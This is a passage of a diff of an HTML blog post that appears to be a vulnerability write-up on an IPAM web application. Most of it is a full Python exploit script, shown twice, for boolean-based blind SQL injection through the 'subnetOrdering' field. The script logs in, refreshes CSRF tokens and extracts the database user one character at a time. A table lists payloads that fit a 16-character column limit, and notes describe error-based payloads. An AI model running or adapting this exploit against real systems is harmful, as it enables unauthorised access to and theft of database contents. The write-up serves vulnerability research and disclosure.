-</span></span><span style="display:flex;"><span>PASS <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;password&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>MARKER_1 <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;Customers&#34;</span>
-</span></span><span style="display:flex;"><span>MARKER_2 <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;IPv6&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">class</span> <span style="color:#50fa7b">IPAM_Position_SQLi</span>:
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> __init__(self, target_url, username, password):
-</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>base_url <span style="color:#ff79c6">=</span> target_url<span style="color:#ff79c6">.</span>rstrip(<span style="color:#f1fa8c">&#39;/&#39;</span>)
-</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>username <span style="color:#ff79c6">=</span> username
-</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>password <span style="color:#ff79c6">=</span> password
-</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>session <span style="color:#ff79c6">=</span> requests<span style="color:#ff79c6">.</span>Session()
-</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>csrf_token <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">None</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">login</span>(self):
-</span></span><span style="display:flex;"><span>        r <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>session<span style="color:#ff79c6">.</span>post(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{</span>self<span style="color:#ff79c6">.</span>base_url<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/app/login/login_check.php&#34;</span>, data<span style="color:#ff79c6">=</span>{
-</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#39;ipamusername&#39;</span>: self<span style="color:#ff79c6">.</span>username,
-</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#39;ipampassword&#39;</span>: self<span style="color:#ff79c6">.</span>password,
-</span></span><span style="display:flex;"><span>        })
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#34;Login successful&#34;</span> <span style="color:#ff79c6">in</span> r<span style="color:#ff79c6">.</span>text
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">refresh_csrf</span>(self):
-</span></span><span style="display:flex;"><span>        r <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>session<span style="color:#ff79c6">.</span>post(
-</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{</span>self<span style="color:#ff79c6">.</span>base_url<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/app/admin/sections/edit.php&#34;</span>,
-</span></span><span style="display:flex;"><span>            data<span style="color:#ff79c6">=</span>{<span style="color:#f1fa8c">&#39;action&#39;</span>: <span style="color:#f1fa8c">&#39;edit&#39;</span>, <span style="color:#f1fa8c">&#39;sectionid&#39;</span>: <span style="color:#f1fa8c">&#39;2&#39;</span>}
-</span></span><span style="display:flex;"><span>        )
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">match</span> <span style="color:#ff79c6">=</span> re<span style="color:#ff79c6">.</span>search(<span style="color:#f1fa8c">r</span><span style="color:#f1fa8c">&#39;name=&#34;csrf_cookie&#34; value=&#34;([^&#34;]+)&#34;&#39;</span>, r<span style="color:#ff79c6">.</span>text)
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">match</span>:
-</span></span><span style="display:flex;"><span>            self<span style="color:#ff79c6">.</span>csrf_token <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">match</span><span style="color:#ff79c6">.</span>group(<span style="color:#bd93f9">1</span>)
-</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">True</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">inject_payload</span>(self, payload):
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">len</span>(payload) <span style="color:#ff79c6">&gt;</span> <span style="color:#bd93f9">16</span>:
-</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;[!] PAYLOAD TOO LONG: </span><span style="color:#f1fa8c">{</span>payload<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
-</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">False</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>session<span style="color:#ff79c6">.</span>post(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{</span>self<span style="color:#ff79c6">.</span>base_url<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/app/admin/sections/edit-result.php&#34;</span>, data<span style="color:#ff79c6">=</span>{
-</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#39;id&#39;</span>: <span style="color:#f1fa8c">&#39;1&#39;</span>, <span style="color:#f1fa8c">&#39;action&#39;</span>: <span style="color:#f1fa8c">&#39;edit&#39;</span>, <span style="color:#f1fa8c">&#39;name&#39;</span>: <span style="color:#f1fa8c">&#39;Customers&#39;</span>,
-</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#39;description&#39;</span>: <span style="color:#f1fa8c">&#39;Inject&#39;</span>, <span style="color:#f1fa8c">&#39;subnetOrdering&#39;</span>: payload,
-</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#39;strictMode&#39;</span>: <span style="color:#f1fa8c">&#39;1&#39;</span>, <span style="color:#f1fa8c">&#39;showSubnet&#39;</span>: <span style="color:#f1fa8c">&#39;1&#39;</span>, <span style="color:#f1fa8c">&#39;showVLAN&#39;</span>: <span style="color:#f1fa8c">&#39;0&#39;</span>,
-</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#39;showVRF&#39;</span>: <span style="color:#f1fa8c">&#39;0&#39;</span>, <span style="color:#f1fa8c">&#39;showSupernetOnly&#39;</span>: <span style="color:#f1fa8c">&#39;0&#39;</span>, <span style="color:#f1fa8c">&#39;masterSection&#39;</span>: <span style="color:#f1fa8c">&#39;0&#39;</span>,
-</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#39;csrf_cookie&#39;</span>: self<span style="color:#ff79c6">.</span>csrf_token
-</span></span><span style="display:flex;"><span>        })
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">True</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">check_truth</span>(self):
-</span></span><span style="display:flex;"><span>        r <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>session<span style="color:#ff79c6">.</span>get(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">{</span>self<span style="color:#ff79c6">.</span>base_url<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">/index.php?page=subnets&amp;section=1&#34;</span>)
-</span></span><span style="display:flex;"><span>        pos1 <span style="color:#ff79c6">=</span> r<span style="color:#ff79c6">.</span>text<span style="color:#ff79c6">.</span>find(MARKER_1)
-</span></span><span style="display:flex;"><span>        pos2 <span style="color:#ff79c6">=</span> r<span style="color:#ff79c6">.</span>text<span style="color:#ff79c6">.</span>find(MARKER_2)
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> pos1 <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span> <span style="color:#ff79c6">or</span> pos2 <span style="color:#ff79c6">==</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span>:
-</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">None</span>
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">return</span> pos1 <span style="color:#ff79c6">&lt;</span> pos2
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">exploit</span>(self):
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> self<span style="color:#ff79c6">.</span>login():
-</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># Calibrate: establish TRUE and FALSE baselines</span>
-</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>refresh_csrf()
-</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>inject_payload(<span style="color:#f1fa8c">&#34;id&gt;0&#34;</span>)  <span style="color:#6272a4"># Always TRUE</span>
-</span></span><span style="display:flex;"><span>        baseline_true <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>check_truth()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>refresh_csrf()
-</span></span><span style="display:flex;"><span>        self<span style="color:#ff79c6">.</span>inject_payload(<span style="color:#f1fa8c">&#34;id&lt;0&#34;</span>)  <span style="color:#6272a4"># Always FALSE</span>
-</span></span><span style="display:flex;"><span>        baseline_false <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>check_truth()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> baseline_true <span style="color:#ff79c6">==</span> baseline_false:
-</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[-] Sort order didn&#39;t change. Adjust markers.&#34;</span>)
-</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">return</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#6272a4"># Extract data character by character</span>
-</span></span><span style="display:flex;"><span>        charset <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;abcdefghijklmnopqrstuvwxyz0123456789_@.&#34;</span>
-</span></span><span style="display:flex;"><span>        extracted <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;[*] Extracting data...&#34;</span>)
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">while</span> <span style="color:#ff79c6">True</span>:
-</span></span><span style="display:flex;"><span>            found <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">False</span>
-</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">for</span> c <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">sorted</span>(charset):
-</span></span><span style="display:flex;"><span>                payload <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;user()&gt;&#39;</span><span style="color:#f1fa8c">{</span>extracted<span style="color:#f1fa8c">}{</span>c<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#39;&#34;</span>
-</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> self<span style="color:#ff79c6">.</span>inject_payload(payload):
-</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">return</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>                self<span style="color:#ff79c6">.</span>refresh_csrf()
-</span></span><span style="display:flex;"><span>                result <span style="color:#ff79c6">=</span> self<span style="color:#ff79c6">.</span>check_truth()
-</span></span><span style="display:flex;"><span>                is_true <span style="color:#ff79c6">=</span> (result <span style="color:#ff79c6">==</span> baseline_true)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> is_true:
-</span></span><span style="display:flex;"><span>                    extracted <span style="color:#ff79c6">+=</span> c
-</span></span><span style="display:flex;"><span>                    <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;[+] Found: </span><span style="color:#f1fa8c">{</span>c<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c"> | Current: </span><span style="color:#f1fa8c">{</span>extracted<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
-</span></span><span style="display:flex;"><span>                    found <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">True</span>
-</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">break</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> found:
-</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">break</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">[+] Extracted: </span><span style="color:#f1fa8c">{</span>extracted<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> __name__ <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;__main__&#34;</span>:
-</span></span><span style="display:flex;"><span>    app <span style="color:#ff79c6">=</span> IPAM_Position_SQLi(TARGET, USER, PASS)
-</span></span><span style="display:flex;"><span>    app<span style="color:#ff79c6">.</span>exploit()
-</span></span></code></pre></div><h3 id="the-varchar16-constraint">The VARCHAR(16) Constraint</h3>
-<p>The <code>subnetOrdering</code> column is defined as <code>VARCHAR(16)</code>, which severely limits payload length. Here's what fits and what doesn't:</p>
-<table>
-  <thead>
-      <tr>
-          <th>Payload</th>
-          <th>Length</th>
-          <th>Works?</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td><code>SLEEP(3)</code></td>
-          <td>8</td>
-          <td>Yes</td>
-      </tr>
-      <tr>
-          <td><code>id&gt;5</code></td>
-          <td>4</td>
-          <td>Yes</td>
-      </tr>
-      <tr>
-          <td><code>IF(1=1,1,2)</code></td>
-          <td>11</td>
-          <td>Yes</td>
-      </tr>
-      <tr>
-          <td><code>USER()</code></td>
-          <td>6</td>
-          <td>Yes</td>
-      </tr>
-      <tr>
-          <td><code>@@version&gt;'10'</code></td>
-          <td>14</td>
-          <td>Yes</td>
-      </tr>
-      <tr>
-          <td><code>@@version&gt;'10.5'</code></td>
-          <td>16</td>
-          <td>Yes (limit!)</td>
-      </tr>
-      <tr>
-          <td><code>(SELECT USER())</code></td>
-          <td>14</td>
-          <td>Yes</td>
-      </tr>
-      <tr>
-          <td><code>IF(1=1,SLEEP(3),1)</code></td>
-          <td>18</td>
-          <td>No (too long)</td>
-      </tr>
-  </tbody>
-</table>
-<p>This constraint makes exploitation more challenging but far from impossible. The boolean-based positional technique works well within these limits.</p>
-<h3 id="other-confirmed-techniques">Other Confirmed Techniques</h3>
-<p><strong>Error-Based</strong>  payloads like <code>EXP(999)</code> or <code>POW(9,9,9)</code> trigger visible SQL errors on the page, confirming injection:</p>
-<pre tabindex="0"><code>SQLSTATE[22003]: Numeric value out of range: 1690
+</code></pre><p>The exploit script automates this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#ff79c6>import</span> requests
+</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> re
+</span></span><span style=display:flex><span><span style=color:#ff79c6>import</span> sys
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>TARGET <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;http://localhost&#34;</span>
+</span></span><span style=display:flex><span>USER <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;admin&#34;</span>
+</span></span><span style=display:flex><span>PASS <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;password&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>MARKER_1 <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;Customers&#34;</span>
+</span></span><span style=display:flex><span>MARKER_2 <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;IPv6&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#ff79c6>class</span> <span style=color:#50fa7b>IPAM_Position_SQLi</span>:
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>def</span> __init__(self, target_url, username, password):
+</span></span><span style=display:flex><span>        self<span style=color:#ff79c6>.</span>base_url <span style=color:#ff79c6>=</span> target_url<span style=color:#ff79c6>.</span>rstrip(<span style=color:#f1fa8c>&#39;/&#39;</span>)
+</span></span><span style=display:flex><span>        self<span style=color:#ff79c6>.</span>username <span style=color:#ff79c6>=</span> username
+</span></span><span style=display:flex><span>        self<span style=color:#ff79c6>.</span>password <span style=color:#ff79c6>=</span> password
+</span></span><span style=display:flex><span>        self<span style=color:#ff79c6>.</span>session <span style=color:#ff79c6>=</span> requests<span style=color:#ff79c6>.</span>Session()
+</span></span><span style=display:flex><span>        self<span style=color:#ff79c6>.</span>csrf_token <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>None</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>def</span> <span style=color:#50fa7b>login</span>(self):
+</span></span><span style=display:flex><span>        r <span style=color:#ff79c6>=</span> self<span style=color:#ff79c6>.</span>session<span style=color:#ff79c6>.</span>post(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>{</span>self<span style=color:#ff79c6>.</span>base_url<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>/app/login/login_check.php&#34;</span>, data<span style=color:#ff79c6>=</span>{
+</span></span><span style=display:flex><span>            <span style=color:#f1fa8c>&#39;ipamusername&#39;</span>: self<span style=color:#ff79c6>.</span>username,
+</span></span><span style=display:flex><span>            <span style=color:#f1fa8c>&#39;ipampassword&#39;</span>: self<span style=color:#ff79c6>.</span>password,
+</span></span><span style=display:flex><span>        })
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> <span style=color:#f1fa8c>&#34;Login successful&#34;</span> <span style=color:#ff79c6>in</span> r<span style=color:#ff79c6>.</span>text
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>def</span> <span style=color:#50fa7b>refresh_csrf</span>(self):
+</span></span><span style=display:flex><span>        r <span style=color:#ff79c6>=</span> self<span style=color:#ff79c6>.</span>session<span style=color:#ff79c6>.</span>post(
+</span></span><span style=display:flex><span>            <span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>{</span>self<span style=color:#ff79c6>.</span>base_url<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>/app/admin/sections/edit.php&#34;</span>,
+</span></span><span style=display:flex><span>            data<span style=color:#ff79c6>=</span>{<span style=color:#f1fa8c>&#39;action&#39;</span>: <span style=color:#f1fa8c>&#39;edit&#39;</span>, <span style=color:#f1fa8c>&#39;sectionid&#39;</span>: <span style=color:#f1fa8c>&#39;2&#39;</span>}
+</span></span><span style=display:flex><span>        )
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>match</span> <span style=color:#ff79c6>=</span> re<span style=color:#ff79c6>.</span>search(<span style=color:#f1fa8c>r</span><span style=color:#f1fa8c>&#39;name=&#34;csrf_cookie&#34; value=&#34;([^&#34;]+)&#34;&#39;</span>, r<span style=color:#ff79c6>.</span>text)
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>match</span>:
+</span></span><span style=display:flex><span>            self<span style=color:#ff79c6>.</span>csrf_token <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>match</span><span style=color:#ff79c6>.</span>group(<span style=color:#bd93f9>1</span>)
+</span></span><span style=display:flex><span>            <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>True</span>
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>False</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>def</span> <span style=color:#50fa7b>inject_payload</span>(self, payload):
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> <span style=color:#8be9fd;font-style:italic>len</span>(payload) <span style=color:#ff79c6>&gt;</span> <span style=color:#bd93f9>16</span>:
+</span></span><span style=display:flex><span>            <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;[!] PAYLOAD TOO LONG: </span><span style=color:#f1fa8c>{</span>payload<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&#34;</span>)
+</span></span><span style=display:flex><span>            <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>False</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        self<span style=color:#ff79c6>.</span>session<span style=color:#ff79c6>.</span>post(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>{</span>self<span style=color:#ff79c6>.</span>base_url<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>/app/admin/sections/edit-result.php&#34;</span>, data<span style=color:#ff79c6>=</span>{
+</span></span><span style=display:flex><span>            <span style=color:#f1fa8c>&#39;id&#39;</span>: <span style=color:#f1fa8c>&#39;1&#39;</span>, <span style=color:#f1fa8c>&#39;action&#39;</span>: <span style=color:#f1fa8c>&#39;edit&#39;</span>, <span style=color:#f1fa8c>&#39;name&#39;</span>: <span style=color:#f1fa8c>&#39;Customers&#39;</span>,
+</span></span><span style=display:flex><span>            <span style=color:#f1fa8c>&#39;description&#39;</span>: <span style=color:#f1fa8c>&#39;Inject&#39;</span>, <span style=color:#f1fa8c>&#39;subnetOrdering&#39;</span>: payload,
+</span></span><span style=display:flex><span>            <span style=color:#f1fa8c>&#39;strictMode&#39;</span>: <span style=color:#f1fa8c>&#39;1&#39;</span>, <span style=color:#f1fa8c>&#39;showSubnet&#39;</span>: <span style=color:#f1fa8c>&#39;1&#39;</span>, <span style=color:#f1fa8c>&#39;showVLAN&#39;</span>: <span style=color:#f1fa8c>&#39;0&#39;</span>,
+</span></span><span style=display:flex><span>            <span style=color:#f1fa8c>&#39;showVRF&#39;</span>: <span style=color:#f1fa8c>&#39;0&#39;</span>, <span style=color:#f1fa8c>&#39;showSupernetOnly&#39;</span>: <span style=color:#f1fa8c>&#39;0&#39;</span>, <span style=color:#f1fa8c>&#39;masterSection&#39;</span>: <span style=color:#f1fa8c>&#39;0&#39;</span>,
+</span></span><span style=display:flex><span>            <span style=color:#f1fa8c>&#39;csrf_cookie&#39;</span>: self<span style=color:#ff79c6>.</span>csrf_token
+</span></span><span style=display:flex><span>        })
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>True</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>def</span> <span style=color:#50fa7b>check_truth</span>(self):
+</span></span><span style=display:flex><span>        r <span style=color:#ff79c6>=</span> self<span style=color:#ff79c6>.</span>session<span style=color:#ff79c6>.</span>get(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;</span><span style=color:#f1fa8c>{</span>self<span style=color:#ff79c6>.</span>base_url<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>/index.php?page=subnets&amp;section=1&#34;</span>)
+</span></span><span style=display:flex><span>        pos1 <span style=color:#ff79c6>=</span> r<span style=color:#ff79c6>.</span>text<span style=color:#ff79c6>.</span>find(MARKER_1)
+</span></span><span style=display:flex><span>        pos2 <span style=color:#ff79c6>=</span> r<span style=color:#ff79c6>.</span>text<span style=color:#ff79c6>.</span>find(MARKER_2)
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> pos1 <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span> <span style=color:#ff79c6>or</span> pos2 <span style=color:#ff79c6>==</span> <span style=color:#ff79c6>-</span><span style=color:#bd93f9>1</span>:
+</span></span><span style=display:flex><span>            <span style=color:#ff79c6>return</span> <span style=color:#ff79c6>None</span>
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>return</span> pos1 <span style=color:#ff79c6>&lt;</span> pos2
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#ff79c6>def</span> <span style=color:#50fa7b>exploit</span>(self):
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>not</span> self<span style=color:#ff79c6>.</span>login():
+</span></span><span style=display:flex><span>            <span style=color:#ff79c6>return</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#6272a4># Calibrate: establish TRUE and FALSE baselines</span>
+</span></span><span style=display:flex><span>        self<span style=color:#ff79c6>.</span>refresh_csrf()
+</span></span><span style=display:flex><span>        self<span style=color:#ff79c6>.</span>inject_payload(<span style=color:#f1fa8c>&#34;id&gt;0&#34;</span>)  <span style=color:#6272a4># Always TRUE</span>
+</span></span><span style=display:flex><span>        baseline_true <span style=color:#ff79c6>=</span> self<span style=color:#ff79c6>.</span>check_truth()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        self<span style=color:#ff79c6>.</span>refresh_csrf()
+</span></span><span style=display:flex><span>        self<span style=color:#ff79c6>.</span>inject_payload(<span style=color:#f1fa8c>&#34;id&lt;0&#34;</span>)  <span style=color:#6272a4># Always FALSE</span>
+</span></span><span style=display:flex><span>        baseline_false <span style=color:#ff79c6>=</span> self<span style=color:#ff79c6>.</span>check_truth()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>if</span> baseline_true <span style=color:#ff79c6>==</span> baseline_false:
+</span></span><span style=display:flex><span>            <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>&#34;[-] Sort order didn&#39;t change. Adjust markers.&#34;</span>)
+</span></span><span style=display:flex><span>            <span style=color:#ff79c6>return</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#6272a4># Extract data character by character</span>
+</span></span><span style=display:flex><span>        charset <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;abcdefghijklmnopqrstuvwxyz0123456789_@.&#34;</span>
+</span></span><span style=display:flex><span>        extracted <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>&#34;[*] Extracting data...&#34;</span>)
+</span></span><span style=display:flex><span>        <span style=color:#ff79c6>while</span> <span style=color:#ff79c6>True</span>:
+</span></span><span style=display:flex><span>            found <span style=color:#ff79c6>=</span> <span style=color:#ff79c6>False</span>
+</span></span><span style=display:flex><span>            <span style=color:#ff79c6>for</span> c <span style=color:#ff79c6>in</span> <span style=color:#8be9fd;font-style:italic>sorted</span>(charset):
+</span></span><span style=display:flex><span>                payload <span style=color:#ff79c6>=</span> <span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;user()&gt;&#39;</span><span style=color:#f1fa8c>{</span>extracted<span style=color:#f1fa8c>}{</span>c<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&#39;&#34;</span>
+</span></span><span style=display:flex><span>                <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>not</span> self<span style=color:#ff79c6>.</span>inject_payload(payload):
+</span></span><span style=display:flex><span>                    <span style=color:#ff79c6>return</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                self<span style=color:#ff79c6>.</span>refresh_csrf()
+</span></span><span style=display:flex><span>                result <span style=color:#ff79c6>=</span> self<span style=color:#ff79c6>.</span>check_truth()
+</span></span><span style=display:flex><span>                is_true <span style=color:#ff79c6>=</span> (result <span style=color:#ff79c6>==</span> baseline_true)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                <span style=color:#ff79c6>if</span> <span style=color:#ff79c6>not</span> is_true:
+</span></span><span style=display:flex><span>                    extracted <span style=color:#ff79c6>+=</span> c
+</span></span><span style=display:flex><span>                    <span style=color:#8be9fd;font-style:italic>print</span>(<span style=color:#f1fa8c>f</span><span style=color:#f1fa8c>&#34;[+] Found: </span><span style=color:#f1fa8c>{</span>c<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c> | Current: </span><span style=color:#f1fa8c>{</span>extracted<span style=color:#f1fa8c>}</span><span style=color:#f1fa8c>&#34;</span>)
